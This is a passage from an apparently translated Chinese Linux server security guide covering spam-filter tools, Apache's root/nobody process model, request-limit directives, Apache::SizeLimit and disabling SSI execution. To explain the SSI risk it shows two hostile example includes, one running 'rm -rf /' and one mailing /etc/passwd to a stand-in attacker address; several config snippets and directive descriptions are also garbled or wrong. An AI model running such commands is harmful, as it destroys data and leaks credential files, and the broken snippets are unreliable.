    对 SMTP 封包和邮件标头进行各种检查：如果任何一项检查失败，邮件将被退回。Blackmail 可以通过 DNS 验证垃圾邮件网站、关键词、主机名和电子邮件地址的有效性，使用黑洞列表（如
    RBL）检查 IP 地址，验证垃圾邮件签名（例如证明“收件人”和“发件人”地址不匹配），以及验证标头信息的正确性。


    [Junkfilter](http://junkfilter.zer0.org/) 是一个基于 Procmail 的过滤系统。Procmail 是 Linux
    和 Unix 系统中非常流行且强大的邮件处理程序。Junkfilter 采用 BSD 许可证（http://junkfilter.zer0.org/pkg/current/LICENSE）。Junkfilter
    和 Procmail 提供了一个高度配置且灵活的垃圾邮件过滤系统。例如，我见过 Junkfilter 被用作“自动回复”向垃圾邮件发送者发送退回邮件，使其尝试发送的垃圾邮件到达一个无效邮箱（许多邮件服务器随后会对其进行删除）。


    为邮件附件制定特定策略应该是你整体安全管理计划的一部分。关于定义邮件附件安全策略的建议，请参阅：http://www.advosys.com/tips/attachment-policy.html


    # Linux Web 和应用服务器


    Apache 是一个极其灵活的 Web 服务器。在我多年工作 Apache 的，我看到它被应用于从手表一样小的设备到最大的大型机计算机。此外，Apache
    被应用于众多应用领域，随着 Web 服务的兴起，作为服务平台的 Apache 将变得更加流行。这种灵活性、演进能力和良好记录就是为什么 Apache 占据了
    Web 市场份额的原因。这也是为什么保护 Linux 服务器基础设施中这一关键方面如此关重要的原因。


    首先，理解 Apache 如何运行和操作至关重要。Apache 通常绑定到 TCP 端口 80（提供 HTTP 服务的默认端口）。当服务在端口上运行时，它必须以
    root 身份启动，因为 1023 以下的端口（“良性端口”）被认为是特权端口，因此具有更改派生守护进程用户的权限。这是通过在 httpd 配置中设置“User”和“Group”名称来实现的。默认配置为
    User 和 Group “nobody”。以下显示了父进程以 root 启动，而派生进程以 nobody 身份运行并处理请求：


    ```bash

    root@ordor config# ps -ef | grep http

    root 5675 0:00 00:00 /usr/local/apache/bin/httpd

    nobody 5676 0:00 00:00 /usr/local/apache/bin/httpd

    nobody 5677 0:00 00:00 /usr/local/apache/bin/httpd

    nobody 5678 0:00 00:00 /usr/local/apache/bin/httpd

    nobody 5679 0:00 00:00 /usr/local/apache/bin/httpd

    nobody 5680 0:00 00:00 /usr/local/apache/bin/httpd

    ```


    邮件服务器管理员应对 SPAM 相关主题和问题（如中继和 RBL）有深入理解。有关这些主题的更多信息，请参阅：http://mailabuse.org/rbl/
    和 http://www.spamtrap.org/。由于 HTTP 构建在 Apache 之上，关于 Apache 配置和操作的注释同样适用于 HTTP
    服务器。IANA 端口编号：http://www.iana.org/assignments/port-numbers


    当配置这些用户和组时，许多人会专门创建一个用户或组来处理 httpd 进程（例如“web”）。另一种避免以 root 身份启动进程的方法是在 1023 以上的端口上运行
    Apache（许多网站使用 8080），这允许由非特权用户启动 Apache。


    # Apache 安全配置


    正如我们在上面通过 Group 指令看到的，MaxRequests 限制了单个连接可以发送请求的数量。这是控制潜在 DoS 攻击的另一种方法。增大此参数可以提高性能，但也增加了有人尝试
    DoS 攻击的可能性。默认值为 100，我发现对于你的站点需求来说这是一个很好的设置。


    KeepAliveTimeout 限制了 Apache 等待同一客户端下一个请求的秒数。默认值为 15，它可以是另一个有效的配置，用于关闭攻击者可能保持开启以进行
    DoS 的连接。


    LimitRequestBody 指定了请求体中允许的字节数（0 表示无限）。默认值由编译时常量 DEFAULT_LIMIT_BODY (0) 定义。LimitRequestBody
    指令允许用户在每个目录、每个文件或每个位置的上下文中设置请求消息体允许的大小限制。如果客户端超过该限制，服务器将返回错误响应而不是处理请求。普通消息体的大小将根据资源的性质有很大差异。


    LimitRequestFields 接收一个从 0（表示无限）到 32767 的整数。默认值客户端使用的请求字段数量极少超过 20，但在不同的客户端实现之间可能会有所不同。此指令可以限制标头的暴露，防止攻击者尝试通过异常长的请求标头列表使服务器溢出。其他限制指令还包括：


    - LimitRequestSize：限制每个请求标头的大小；

    - LimitRequestLine：限制每行请求的长度；

    - LimitRequestBody：限制基于 XML 的请求的最大字节大小。


    限制物理资源是另一种有效方法，可以为 Apache 进程和应用程序提供“备份”，防止它们崩溃你的服务器。这些通常被用作安全机制，防止针对你的 Web 服务器的攻击导致整个机器宕机。Apache::SizeLimit
    是一个 Perl 模块，允许在 Apache 进程增长过大时将其杀死（无论是由于攻击故意增长，还是由于 Bug 或内存泄漏无意中增长）。这可以是对 Apache
    服务器上的一个有用控制，以限制由于失控进程导致 Linux 输出崩溃的可能性。以下是在你的 httpd.conf 中配置 Apache::SizeLimit
    方法：


    ```perl

    FixHandler Apache::SizeLimit

    use Apache::SizeLimit;

    # 最大共享 -- 仅杀死真正使用过多物理内存的进程

    MAX_UNSHARED_SIZE = 30000; # 30MB

    # 每次调用进程检查器时检查进程大小

    CHECK_EVERY_N_REQUESTS = 2;

    ```


    服务器包含 (SSI) 是在 Web 页面包含动态内容的强大方式，例如显示当前日期和时间，以及如下嵌入在 Web 页面中的服务器包含：


    ```

    <!--exec cmd="date +%x"/>

    ```


    这会在网页上输出：

    11/16/2001


    如果没有适当的安全措施，SSI 允许从 Web 页面调用 Linux 程序——这会暴露大量的安全风险。如果你的站点不需要 SSI，你可以指定：


    Options None


    此指令将禁用其所在容器内的所有“Options”。如果你的站点需要 SSI 功能，强烈建议禁止通过 SSI 执行 CGI 脚本：


    Options IncludesNOEXEC


    这允许服务器包含，但禁用通过 #exec 或 #include 执行程序。为什么要费此精力？有两个原因。第一是它可能带来巨大的安全风险，例如：


    ```

    <!--exec cmd="rm -rf /"/>

    <!--exec cmd="mail badguy@badguysite.org | cat /etc/passwd"/>

    ```


    显然，这些是非常恶意的包含，但如果你的服务器没有妥善配置 SSI 和 CGI 安全，它们可能会被允许。第二个原因是有多种更安全、高效的方法可以为 Web 页面提供动态内容，例如使用受保护的
    CGI、PHP 程序或 Java 应用程序。


    Apache 提供了一个方便的工具来按目录配置，称为 .htaccess。“htaccess” 是一个包含 Apache 配置指令的文件。这些指令适用于该目录下的所有内容。


    其他相关模块包括 mod_throttle、Apache::Resource 和 Randal Schwartz 的 Throttle 模块。


